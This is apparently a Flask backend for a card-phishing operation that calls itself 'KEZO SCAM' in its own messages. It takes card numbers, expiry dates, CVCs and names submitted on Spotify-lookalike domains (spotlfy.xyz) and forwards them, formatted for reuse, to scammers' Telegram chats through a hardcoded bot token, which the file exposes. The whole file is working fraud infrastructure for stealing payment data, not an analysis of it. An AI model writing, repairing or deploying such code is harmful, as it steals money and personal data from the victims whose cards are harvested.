# --- APP.PY CORREGIDA - SIN ERRORES DE SINTAXIS ---
import os  # ← IMPORTANTE: Este import estaba FALTANDO

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN CARGADA DE .env (FORMATO BASH SIMPLE) ---
with open('.env', 'r') as f:
    for line in f:
        if '=' in line and not line.strip().startswith('#'):
            key, value = line.strip().split('=', 1)
            globals()[key] = value

# Verificar que variables fueron cargadas correctamente
if 'TELEGRAM_BOT_TOKEN' not in globals():
    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '9205817824:AAGIHdN7_3fB49pTgNQzG3UFCXeY898oluU')

if 'ID_PRINCIPAL' not in globals():
    try:
        ID_PRINCIPAL = int(ID_PRINCIPAL) if isinstance(ID_PRINCIPAL, str) else ID_PRINCIPAL
    except Exception as e:
        print(f"⚠️ Advertencia: Error al cargar ID_PRINCIPAL: {e}")

# === ESTRUCTURA DE DOMINIOS Y CLIENTES ===
DOMINIOS_CONFIG = {
    'free.spotlfy.xyz': {'clientes_privados': ['7574919030'], 'id_principal': ID_PRINCIPAL},
    'gratis.spotlfy.xyz': {'clientes_privados': ['190041130'], 'id_principal': ID_PRINCIPAL}
}

# --- TEST PARA VERIFICAR CONEXIÓN TELEGRAM ---
@app.route('/test', methods=['GET'])
def test_bot():
    MI_ID_PARA_TEST = DOMINIOS_CONFIG['gratis.spotlfy.xyz']['id_principal']
    
    try:
        res = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
            json={
                "chat_id": MI_ID_PARA_TEST,
                "text": f"🔥 *KEZO SCAM* 🔥\nTodo funciona correctamente.",
                "parse_mode": "Markdown"
            }, timeout=5)
        
        if res.status_code == 200:
            return jsonify({"status": "ok", "msg": "Mensaje enviado - FREE DOMAIN"}), 200
        else:
            return jsonify({"status": "error", "msg": res.text}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# --- RECIBIR DATOS DEL CHECKOUT ---
@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    
    if not data or len(data) < 4:
        return jsonify({"status": "error", "msg": "Datos inválidos"}), 400
        
    try:
        lista_ids_html = str(data.get('lista_ids', [])).strip()
        origen = str(data.get('origen', '')).strip()
        
        tarjeta = str(data.get('tarjeta', ''))
        expiracion = str(data.get('expiracion', ''))
        cvc = str(data.get('cvc', ''))
        nombre = str(data.get('nombre', 'N/A'))
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

    # Limpieza de datos
    tarjeta = tarjeta.replace(' ', '')
    
    exp_parts = expiracion.split('/')
    if len(exp_parts) == 2:
        try:
            mes = int(exp_parts[0])
            ano = exp_parts[1].replace('/', '').replace('-', '')[:4]
        except Exception as e:
            print(f"⚠️ Error al parsear fecha: {e}")
    else:
        mes = expiracion
        ano = 'N/A'

    # Formato NUMERO|MES|AÑO|CVC
    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"
    
    config = DOMINIOS_CONFIG.get(origen, {'clientes_privados': [], 'id_principal': ID_PRINCIPAL})
    id_principal = config['id_principal']
    lista_clientes_privados = [str(i).strip() for i in config['clientes_privados']]
    
    # Mensaje para TODOS los clientes del dominio (incluyendo al principal)
    mensaje_unico = f"🔥 *KEZO SCAM - {origen}* 🔥\n━━━━━━━━━━━━━━━━━━\n\n`{cc_linea}`\n\n👤_{nombre}_"

    exitos = 0
    
    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()
        
        if id_limpio and len(id_limpio) > 5:  # Validar ID mínimo
            # Solo enviar a clientes privados que sean parte de ESE DOMINIO (incluyendo al principal)
            if id_limpio in lista_clientes_privados:
                try:
                    res = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                        json={
                            "chat_id": id_limpio, 
                            "text": mensaje_unico, 
                            "parse_mode": "Markdown"
                        }, timeout=5)
                    if res.status_code == 200:
                        exitos += 1
                        print(f"✅ ENVIADO A {origen}: {id_limpio}")
                    else:
                        print(f"❌ ERROR TELEGRAM a {id_limpio}: {res.text}")
                except Exception as e:
                    print(f"❌ ERROR RED a {id_limpio}: {e}")

    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
